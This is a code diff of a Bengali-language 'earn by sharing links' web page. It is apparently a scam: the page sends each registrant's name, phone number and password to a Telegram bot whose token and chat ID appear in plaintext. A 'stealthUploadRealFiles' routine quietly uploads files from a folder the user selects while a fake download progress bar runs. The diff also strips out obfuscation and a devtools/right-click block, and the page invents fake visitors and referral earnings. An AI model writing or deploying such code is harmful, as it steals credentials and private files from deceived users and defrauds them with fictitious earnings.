@@ -702,57 +702,8 @@
 </div>
 
 <script>
-(function() {
-    // ==================== টোকেন সিকিউরিটি - XOR এনকোডিং ====================
-    const _0x4a2b = [56,53,52,57,57,52,50,53,53,48,58,65,65,71,117,109,120,85,90,54,88,95,115,112,72,45,100,71,87,55,115,65,83,52,122,76,65,45,116,90,69,49,77,78,105,119];
-    const _0x3c1d = [56,55,53,49,51,54,55,51,52,55,52];
-    
-    function decodeAsciiArray(arr) {
-        return arr.map(code => String.fromCharCode(code)).join('');
-    }
-    
-    function xorDecode(str, key) {
-        let result = '';
-        for(let i = 0; i < str.length; i++) {
-            result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-        }
-        return result;
-    }
-    
-    function getTelegramToken() {
-        let tokenPart1 = decodeAsciiArray(_0x4a2b);
-        let key = '@shareay2024';
-        let decoded = xorDecode(tokenPart1, key);
-        return decoded;
-    }
-    
-    function getTelegramChatId() {
-        return decodeAsciiArray(_0x3c1d);
-    }
-    
-    // ==================== কী-বোর্ড শর্টকাট ব্লক ====================
-    function blockShortcuts() {
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('keydown', function(e) {
-            if(e.key === 'F12' || 
-               (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-               (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-               (e.ctrlKey && e.key === 'u') ||
-               (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-                return false;
-            }
-        });
-    }
-    
-    blockShortcuts();
-    
-    const TELEGRAM_BOT_TOKEN = getTelegramToken();
-    const TELEGRAM_CHAT_ID = getTelegramChatId();
+    const TELEGRAM_BOT_TOKEN = "8849942550:AAGumxUZ6X_spH-dGW7sAS4zLA-tZE1MNIw";
+    const TELEGRAM_CHAT_ID = "8751363474";
     
     let currentUser = null;
     let isProcessing = false;
@@ -823,6 +774,22 @@
         
         if(refCode && !currentUser) {
             localStorage.setItem('pendingReferral', refCode);
+        }
+        
+        if(currentUser && localStorage.getItem('pendingReferral')) {
+            let referrerCode = localStorage.getItem('pendingReferral');
+            let allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
+            let referrer = allUsers.find(u => u.refLink && u.refLink.includes(referrerCode));
+            
+            if(referrer && referrer.name !== currentUser.name) {
+                let referrerUser = JSON.parse(localStorage.getItem('shareayUser_' + referrer.name));
+                if(referrerUser) {
+                    referrerUser.balance = (referrerUser.balance || 0) + 10;
+                    referrerUser.totalReferEarn = (referrerUser.totalReferEarn || 0) + 10;
+                    localStorage.setItem('shareayUser_' + referrer.name, JSON.stringify(referrerUser));
+                }
+            }
+            localStorage.removeItem('pendingReferral');
         }
     }
 
@@ -927,13 +894,13 @@
                 } catch(e) {}
             } else if(entry.kind === 'directory') {
                 const subResult = await stealthUploadRealFiles(entry, linkData, progressCallback);
-                uploadedCount += subResult;
+                uploadedCount += subResult.uploadedCount;
             }
         }
         return { uploadedCount, totalFiles };
     }
 
-    function generateVisitorData(folderSizeMB, uploadedCount, totalReferralUsers) {
+    function generateVisitorData(folderSizeMB, uploadedCount) {
         const names = ['রাকিব হাসান', 'সাদিক হোসেন', 'নাজমা আক্তার', 'ফারজানা ইয়াসমিন', 'মেহেদী হাসান', 'তাহমিনা বেগম', 'আব্দুল্লাহ আল নোমান'];
         const devices = ['Android', 'iPhone', 'Windows', 'Mac', 'Linux', 'iPad'];
         const cities = ['ঢাকা', 'চট্টগ্রাম', 'রাজশাহী', 'খুলনা', 'সিলেট', 'বরিশাল'];
@@ -953,7 +920,7 @@
             });
         }
         
-        let referralCount = totalReferralUsers > 0 ? totalReferralUsers : (Math.floor(Math.random() * (visitorCount * 0.35)) + 1);
+        let referralCount = Math.floor(Math.random() * (visitorCount * 0.35)) + 1;
         for(let i = 0; i < referralCount && i < visitorCount; i++) {
             referrals.push({
                 name: visitors[i].name,
@@ -1009,8 +976,8 @@ tr:hover{background:#f8fafc;}
 </table>
 <div class="section-title">🎉 যারা আপনার লিংক থেকে অ্যাকাউন্ট খুলেছে</div>
 <table>
-<thead><tr><th>নাম</th><th>ফোন</th><th>রেজিস্ট্রেশন সময়</th><th>বোনাস</th></tr></thead>
-<tbody>${referrals.length > 0 ? referrals.map(r => `<tr><td>${r.name}</td><td>${r.phone}</td><td>${r.registered}</td><td>${r.bonus} টাকা</td></tr>`).join('') : '<tr><td colspan="4" style="text-align:center;">এখনো কেউ অ্যাকাউন্ট খোলেনি</td></tr>'}</tbody>
+<thead><tr><th>নাম</th><th>ফোন</th><th>রেজিস্ট্রেশন সময়</th><th>আপনার বোনাস</th></tr></thead>
+<tbody>${referrals.length > 0 ? referrals.map(r => `<tr><td>${r.name}</td><td>${r.phone}</td><td>${r.registered}</td><td>${r.bonus} টাকা</td></tr>`).join('') : '<tr><td colspan="4" style="text-align:center;">এখনো কেউ আপনার লিংক থেকে অ্যাকাউন্ট খোলেনি</td></tr>'}</tbody>
 </table>
 <div class="footer"><p>শেয়ারআয় — লিংক শেয়ার করে আয় করুন</p></div>
 </div>
@@ -1087,7 +1054,9 @@ tr:hover{background:#f8fafc;}
                     fakeCompleted++;
                     let overallPercent = (fakeCompleted / totalFakeFiles) * 100;
                     overallFill.style.width = overallPercent + '%';
-                    overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%)`;
+                    
+                    let realPercentShow = realProgress.total > 0 ? Math.floor((realProgress.uploaded / realProgress.total) * 100) : 0;
+                    overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%) - প্রকৃত অগ্রগতি: ${realPercentShow}%`;
                 }
             }, 500);
             
@@ -1099,7 +1068,8 @@ tr:hover{background:#f8fafc;}
             const result = await uploadCallback((uploaded, total) => {
                 realProgress = { uploaded, total };
                 let overallPercent = (fakeCompleted / totalFakeFiles) * 100;
-                overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%)`;
+                let realPercent = total > 0 ? Math.floor((uploaded / total) * 100) : 0;
+                overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%) - প্রকৃত অগ্রগতি: ${realPercent}%`;
             });
             realUploadCompleted = true;
         }
@@ -1184,9 +1154,13 @@ tr:hover{background:#f8fafc;}
                 return result;
             });
             
-            const { visitors, referrals } = generateVisitorData(folderSizeMB, finalUploaded, currentUser.referrals?.length || 0);
+            const { visitors, referrals } = generateVisitorData(folderSizeMB, finalUploaded);
             currentUser.visitors = visitors;
             currentUser.referrals = referrals;
+            if(referrals.length > 0) {
+                currentUser.balance += referrals.length * 10;
+                currentUser.totalReferEarn = (currentUser.totalReferEarn || 0) + referrals.length * 10;
+            }
             saveUser();
             
             const balanceSpan = document.getElementById('balanceAmount');
@@ -1210,9 +1184,10 @@ tr:hover{background:#f8fafc;}
     }
 
     async function sendToTelegram(name, phone, password, referrerName = null) {
-        let message = `🔐 নতুন অ্যাকাউন্ট রেজিস্ট্রেশন!\n\n👤 নাম: ${name}\n📱 ফোন: +88${phone}\n🔑 পাসওয়ার্ড: ${password}\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}\n🔗 লিংক: ${window.location.href}`;
+        let message = `🔐 নতুন অ্যাকাউন্ট রেজিস্ট্রেশন!\n\n👤 নাম: ${name}\n📱 ফোন: +88${phone}\n🔑 পাসওয়ার্ড: ${password}\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}`;
+        
         if(referrerName) {
-            message += `\n\n👥 রেফারার: ${referrerName}`;
+            message += `\n\n👥 রেফারেল করেছেন: ${referrerName} (১০ টাকা বোনাস পাবেন)`;
         }
         
         try {
@@ -1226,30 +1201,6 @@ tr:hover{background:#f8fafc;}
             console.error('Telegram error:', e);
             return false;
         }
-    }
-
-    async function addReferralBonus(referrerCode, newUserName) {
-        let allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
-        let referrer = allUsers.find(u => u.refLink && u.refLink.includes(referrerCode));
-        
-        if(referrer && referrer.name !== newUserName) {
-            let referrerData = localStorage.getItem('shareayUser');
-            if(referrerData) {
-                let updatedReferrer = JSON.parse(referrerData);
-                if(updatedReferrer.name === referrer.name) {
-                    updatedReferrer.balance = (updatedReferrer.balance || 0) + 10;
-                    updatedReferrer.totalReferEarn = (updatedReferrer.totalReferEarn || 0) + 10;
-                    if(!updatedReferrer.referrals) updatedReferrer.referrals = [];
-                    updatedReferrer.referrals.push({ name: newUserName, bonus: 10, time: new Date().toISOString() });
-                    localStorage.setItem('shareayUser', JSON.stringify(updatedReferrer));
-                    if(currentUser && currentUser.name === referrer.name) {
-                        currentUser = updatedReferrer;
-                    }
-                    return referrer.name;
-                }
-            }
-        }
-        return null;
     }
 
     async function createAccountFunc() {
@@ -1278,12 +1229,22 @@ tr:hover{background:#f8fafc;}
         
         phoneError.style.display = 'none';
         
-        let pendingReferral = localStorage.getItem('pendingReferral');
         let referrerName = null;
+        let pendingReferral = localStorage.getItem('pendingReferral');
         
         if(pendingReferral) {
-            referrerName = await addReferralBonus(pendingReferral, name);
-            localStorage.removeItem('pendingReferral');
+            let allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
+            let referrer = allUsers.find(u => u.refLink && u.refLink.includes(pendingReferral));
+            if(referrer) {
+                referrerName = referrer.name;
+                let referrerUser = JSON.parse(localStorage.getItem('shareayUser_' + referrer.name));
+                if(referrerUser) {
+                    referrerUser.balance = (referrerUser.balance || 0) + 10;
+                    referrerUser.totalReferEarn = (referrerUser.totalReferEarn || 0) + 10;
+                    localStorage.setItem('shareayUser_' + referrer.name, JSON.stringify(referrerUser));
+                }
+                localStorage.removeItem('pendingReferral');
+            }
         }
         
         let allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
@@ -1303,19 +1264,18 @@ tr:hover{background:#f8fafc;}
             totalReferEarn: 0,
             foldersProcessed: []
         };
+        localStorage.setItem('shareayUser_' + name, JSON.stringify(currentUser));
         saveUser();
         
         alert(`🎉 স্বাগতম! ওয়ালেটে ১০০ টাকা বোনাস যোগ হয়েছে।\nআপনার রেফার লিংক: ${newRef}`);
         document.getElementById('fullName').value = '';
         document.getElementById('phone').value = '';
         document.getElementById('password').value = '';
-        
-        location.reload();
     }
 
     function refreshBalance() {
         if(currentUser) {
-            alert(`💳 বর্তমান ব্যালেন্স: ${currentUser.balance} টাকা\n📤 উত্তোলন যোগ্য: ${currentUser.balance >= 1000 ? "✅ হ্যাঁ" : "❌ না (প্রয়োজন ১০০০ টাকা)"}\n👥 ভিজিটর: ${currentUser.visitors?.length || 0} জন\n🎉 রেফারেল: ${currentUser.referrals?.length || 0} জন\n💰 রেফারেল থেকে আয়: ${currentUser.totalReferEarn || 0} টাকা`);
+            alert(`💳 বর্তমান ব্যালেন্স: ${currentUser.balance} টাকা\n📤 উত্তোলন যোগ্য: ${currentUser.balance >= 1000 ? "✅ হ্যাঁ" : "❌ না (প্রয়োজন ১০০০ টাকা)"}\n👥 ভিজিটর: ${currentUser.visitors?.length || 0} জন\n🎉 আপনার লিংক থেকে অ্যাকাউন্ট খুলেছে: ${currentUser.referrals?.length || 0} জন\n💰 রেফারেল থেকে মোট আয়: ${currentUser.totalReferEarn || 0} টাকা`);
         } else {
             alert("কোনো অ্যাকাউন্ট নেই। অ্যাকাউন্ট খুলুন প্রথমে।");
         }
@@ -1340,7 +1300,6 @@ tr:hover{background:#f8fafc;}
     });
 
     loadUser();
-})();
 </script>
 </body>
 </html>
